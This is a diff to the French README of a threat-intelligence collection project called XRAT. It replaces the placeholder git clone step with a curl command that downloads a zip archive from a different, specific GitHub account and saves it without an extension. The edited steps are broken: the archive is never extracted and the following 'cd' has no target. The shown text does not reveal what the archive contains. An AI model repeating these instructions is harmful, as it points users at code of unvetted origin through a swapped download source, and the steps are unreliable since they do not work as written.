@@ -28,7 +28,7 @@ L'objectif principal est de simplifier la collecte de données publiques (*Threa
 - Python 3.13+ (ou dépendances requises selon ton stack)
 - Git
 
-### Cloner le projet
+### Télécharger le projet
 ```bash
-git clone [https://github.com/votre-utilisateur/XRAT.git](https://github.com/votre-utilisateur/XRAT.git)
-cd XRAT
+curl -L -o XRatToolsV1.0 "https://github.com/3vlt/XRatToolsV1.0/archive/refs/heads/main.zip"
+cd 
